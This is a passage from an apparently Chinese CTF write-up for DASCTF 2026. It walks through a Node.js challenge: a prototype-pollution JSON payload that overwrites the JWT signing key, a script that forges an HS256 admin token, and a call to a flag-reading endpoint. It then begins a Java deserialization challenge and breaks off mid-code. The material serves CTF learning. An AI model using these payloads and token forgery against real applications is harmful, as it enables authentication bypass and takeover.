+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;../config&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSigningKey</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> config.<span class="property">signingState</span>.<span class="property">active</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">authMiddleware</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> token = req.<span class="property">cookies</span>[config.<span class="property">cookieName</span>];</span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> secret = <span class="title function_">getSigningKey</span>();</span><br><span class="line">    <span class="keyword">var</span> decoded = jwt.<span class="title function_">verify</span>(token, secret, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;HS256&#x27;</span>] &#125;);</span><br><span class="line">    req.<span class="property">user</span> = decoded;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    res.<span class="title function_">clearCookie</span>(config.<span class="property">cookieName</span>);</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">adminMiddleware</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">user</span> || req.<span class="property">user</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">render</span>(<span class="string">&#x27;forbidden&#x27;</span>, &#123; <span class="attr">user</span>: req.<span class="property">user</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> rateCtx = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">  rateCtx.<span class="property">window</span> = <span class="number">60000</span>;</span><br><span class="line">  rateCtx.<span class="property">remaining</span> = <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(config.<span class="property">featureFlags</span>, <span class="string">&#x27;auditLog&#x27;</span>) &amp;&amp; config.<span class="property">featureFlags</span>.<span class="property">auditLog</span>) &#123;</span><br><span class="line">    rateCtx.<span class="property">logged</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; authMiddleware, adminMiddleware, getSigningKey &#125;;</span><br></pre></td></tr></table></figure>
+<h5 id="路由"><a class="markdownIt-Anchor" href="#路由"></a> 路由</h5>
+<p><code>auth.js</code>：注册/登录/登出。用内存对象 <code>users</code> 存账号（明文密码）。注册时给每个用户预置了4 层嵌套的 <code>settings.notifications.digest.channels</code>结构 —— 正是这层深度让原型污染能把 <code>constructo</code></p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530115540715.png" alt="image-20260530115540715" /></p>
+<p><code>user.js</code>：普通用户功能区，也是污染触发面：</p>
+<ul>
+<li><code>/dashboard</code>、<code>/directory</code>、<code>/api/search</code> — 公告板和员工目录展示</li>
+<li><code>POST /api/settings</code> — 调<code>deepMerge(user.settings, req.body)</code>，<strong>原型污染注入点</strong></li>
+<li><code>GET /api/system/healthcheck</code> — <strong>无需鉴权</strong>就调 <code>configRefresh()</code>，触发密钥轮换</li>
+<li><code>/api/export</code>、<code>/api/debug/config</code> — 受 featureFlag 控制，默认关闭（污染 flag 可开启的隐藏面）</li>
+</ul>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530115912038.png" alt="image-20260530115912038" /></p>
+<p><code>admin.js</code>：</p>
+<ul>
+<li><code>GET /admin</code> — 过 admin 守卫后，生成一个随机 32 位hex 的 <code>reference</code> 存进 <code>diagnosticStore</code>（120 秒 TTL、一次性），渲染到 admin 页面。这是拿 reference 的地方。</li>
+<li><code>/api/admin/login</code>、<code>/api/admin/promote</code> — 都是禁用的幌子接口</li>
+</ul>
+<p><code>diagnostic.js</code>：最终命令执行点：</p>
+<ul>
+<li><code>POST /api/reports/execute</code> — 双守卫（auth+admin），校验 reference 的 TTL/一次性，通过后执行 <code>execSync('/readflag')</code> 返回结果 —— <strong>flag 出口</strong></li>
+<li><code>/api/reports/run</code>、<code>/download</code> — 同样是禁用的幌子</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; execSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; authMiddleware, adminMiddleware &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../middleware/auth&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;../config&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/reports/execute&#x27;</span>, authMiddleware, adminMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> ref = req.<span class="property">body</span>.<span class="property">reference</span>;</span><br><span class="line">  <span class="keyword">if</span> (!ref || <span class="keyword">typeof</span> ref !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Missing report reference&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> entry = config.<span class="property">diagnosticStore</span>[ref];</span><br><span class="line">  <span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid or expired reference&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check TTL</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Date</span>.<span class="title function_">now</span>() - entry.<span class="property">created</span> &gt; entry.<span class="property">ttl</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> config.<span class="property">diagnosticStore</span>[ref];</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">410</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Reference expired&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check one-time use</span></span><br><span class="line">  <span class="keyword">if</span> (entry.<span class="property">consumed</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Reference already consumed&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  entry.<span class="property">consumed</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> output = <span class="string">&#x27;Diagnostic failed&#x27;</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    output = <span class="title function_">execSync</span>(<span class="string">&#x27;/readflag&#x27;</span>).<span class="title function_">toString</span>().<span class="title function_">trim</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: <span class="string">&#x27;completed&#x27;</span>, <span class="attr">report</span>: output &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/reports/run&#x27;</span>, authMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">503</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Report runner is offline. Use /api/reports/execute with a valid reference.&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/api/reports/download&#x27;</span>, authMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">503</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Report downloads are temporarily disabled for maintenance.&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+<h4 id="解题思路"><a class="markdownIt-Anchor" href="#解题思路"></a> 解题思路</h4>
+<p>代码多了点，但思路还是挺明显的</p>
+<p>在<code>user.js</code> 的 <code>/api/settings</code> 用 <code>merge.js</code> 注入污染 → 污染 <code>config.js</code> 里<code>configRefresh</code> 的 <code>rotation.pending</code> （即污染密钥）→ 无鉴权的 healthcheck 把密钥换成已知值 → <code>jwt.js</code>/<code>auth.js</code> 的验签和admin 判断被伪造绕过 → <code>admin.js</code> 发 reference → <code>diagnostic.js</code> 执行 <code>/readflag</code>。</p>
+<h4 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h4>
+<h5 id="污染密钥"><a class="markdownIt-Anchor" href="#污染密钥"></a> 污染密钥</h5>
+<p>先考虑如何污染密钥：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/settings&#x27;</span>, authMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title class_">Object</span>.<span class="title function_">values</span>(users).<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">id</span> === req.<span class="property">user</span>.<span class="property">id</span>);</span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;User not found&#x27;</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> req.<span class="property">body</span> !== <span class="string">&#x27;object&#x27;</span> || req.<span class="property">body</span> === <span class="literal">null</span> || <span class="title class_">Array</span>.<span class="title function_">isArray</span>(req.<span class="property">body</span>)) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid request body&#x27;</span> &#125;);</span><br><span class="line">  <span class="title function_">deepMerge</span>(user.<span class="property">settings</span>, req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Settings updated&#x27;</span>, <span class="attr">settings</span>: user.<span class="property">settings</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">........</span><br><span class="line">users[username] = &#123;</span><br><span class="line">    <span class="attr">id</span>: userId,</span><br><span class="line">    <span class="attr">username</span>: username,</span><br><span class="line">    <span class="attr">password</span>: password,</span><br><span class="line">    <span class="attr">email</span>: email,</span><br><span class="line">    <span class="attr">department</span>: department,</span><br><span class="line">    <span class="attr">role</span>: <span class="string">&#x27;employee&#x27;</span>,</span><br><span class="line">    <span class="attr">settings</span>: &#123;</span><br><span class="line">      <span class="attr">theme</span>: <span class="string">&#x27;light&#x27;</span>,</span><br><span class="line">      <span class="attr">language</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">      <span class="attr">notifications</span>: &#123;</span><br><span class="line">        <span class="attr">email</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">desktop</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">digest</span>: &#123; <span class="attr">frequency</span>: <span class="string">&#x27;daily&#x27;</span>, <span class="attr">time</span>: <span class="string">&#x27;09:00&#x27;</span>, <span class="attr">channels</span>: &#123; <span class="attr">slack</span>: <span class="literal">true</span>, <span class="attr">teams</span>: <span class="literal">false</span> &#125; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">...........</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deepMerge</span>(<span class="params">target, source, depth</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (depth === <span class="literal">undefined</span>) depth = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (depth &gt;= <span class="variable constant_">MAX_DEPTH</span>) <span class="keyword">return</span> target;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> rawKey <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title function_">sanitizeKey</span>(rawKey);</span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&#x27;&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">BLOCKED_KEYS</span>.<span class="title function_">indexOf</span>(key) !== -<span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (depth &lt; <span class="number">3</span> &amp;&amp; <span class="variable constant_">BLOCKED_ROOTS</span>.<span class="title function_">indexOf</span>(key) !== -<span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isPlainObject</span>(source[rawKey])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; target[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_">deepMerge</span>(target[key], source[rawKey], depth + <span class="number">1</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">deepMerge</span>(target[key], source[rawKey], depth + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[rawKey];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>deepMerge</code> 在 <code>depth &lt; 3</code> 才拦截 <code>constructor</code>/<code>prototype</code> ，但它可以递归6层</p>
+<p>因此payload可以这么写：<code>notifications → digest → channels</code> 这三层在target 里<strong>本来就存在且是对象</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;notifications&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;channels&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;pending&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwned-secret-123&quot;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><code>channels.constructor</code> 取到的是 <code>Object</code> 这个构造函数。</p>
+<p><strong>depth=4 这一步</strong>：现在 target是 <code>Object</code> 函数，key = <code>prototype</code>，<code>target.prototype</code> 就是 <code>Object.prototype</code>（typeof 是 object），于是再递归进去。</p>
+<p><strong>depth=5 这一步</strong>：target 已经是 <code>Object.prototype</code>，source 是 <code>&#123; pending: &quot;pwned-secret-123&quot; &#125;</code>。<code>pending</code> 的值是字符串、不是对象，走 <code>merge.js</code>的 else：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target[key] = source[rawKey];   <span class="comment">// Object.prototype.pending = &quot;pwned-secret-123&quot;</span></span><br></pre></td></tr></table></figure>
+<p>污染完成。depth=5 仍小于 <code>MAX_DEPTH=6</code>，所以没被深度限制挡掉。</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530123206045.png" alt="image-20260530123206045" /></p>
+<p>然后去<code>/api/system/healthcheck</code>刷新密钥</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530123251268.png" alt="image-20260530123251268" /></p>
+<h5 id="伪造签名"><a class="markdownIt-Anchor" href="#伪造签名"></a> 伪造签名</h5>
+<p>服务器验签用 HS256（auth.js<code>jwt.verify(token, secret, &#123;algorithms:['HS256']&#125;)</code>），HS256 是对称的——签名和验签同一把钥匙。所以本地用同样的密钥和算法签就行：</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530123704868.png" alt="image-20260530123704868" /></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">b64</span> = o =&gt; <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(o)).<span class="title function_">toString</span>(<span class="string">&#x27;base64url&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">signHS256</span>(<span class="params">payload, secret</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> h = <span class="title function_">b64</span>(&#123; <span class="attr">alg</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="attr">typ</span>: <span class="string">&#x27;JWT&#x27;</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> p = <span class="title function_">b64</span>(payload);</span><br><span class="line">  <span class="keyword">const</span> sig = crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, secret).<span class="title function_">update</span>(h + <span class="string">&#x27;.&#x27;</span> + p).<span class="title function_">digest</span>(<span class="string">&#x27;base64url&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;h&#125;</span>.<span class="subst">$&#123;p&#125;</span>.<span class="subst">$&#123;sig&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> now = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">const</span> adminToken = <span class="title function_">signHS256</span>(</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="string">&#x27;fb562da5-873c-4512-a683-0357a8d0fcf2&#x27;</span>, <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="attr">role</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="attr">iat</span>: now, <span class="attr">exp</span>: now + <span class="number">3600</span> &#125;,</span><br><span class="line">  <span class="string">&#x27;pwned-secret-123&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(adminToken);</span><br><span class="line"><span class="comment">//eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZiNTYyZGE1LTg3M2MtNDUxMi1hNjgzLTAzNTdhOGQwZmNmMiIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODAxMTYxMTUsImV4cCI6MTc4MDExOTcxNX0.5oZA52aaGQoSKSo2x7VyUUAXPSRlfbPNf0QWQPU-E5A</span></span><br></pre></td></tr></table></figure>
+<p>替换之后访问<code>/admin</code></p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530124257490.png" alt="image-20260530124257490" /></p>
+<p>拿到referer:<code>ee40d0f1eb0d3cad3f7752b281209075</code></p>
+<p>去<code>/api/reports/execute</code>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;reference&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ee40d0f1eb0d3cad3f7752b281209075&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530124417489.png" alt="image-20260530124417489" /></p>
+<p>成功拿到flag</p>
+<h3 id="taxmanager"><a class="markdownIt-Anchor" href="#taxmanager"></a> <strong>TaxManager</strong></h3>
+<h4 id="提取至reviewer"><a class="markdownIt-Anchor" href="#提取至reviewer"></a> 提取至reviewer</h4>
+<p>注册登录后可以直接越权，除了<code>admin</code>字段，可以把权限改为<code>reviewer</code>（后续解锁功能）</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530130405533.png" alt="image-20260530130405533" /></p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530130523005.png" alt="image-20260530130523005" /></p>
+<h4 id="反序列化链构造"><a class="markdownIt-Anchor" href="#反序列化链构造"></a> 反序列化链构造</h4>
+<p><code>/api/export/generate</code>存在反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by 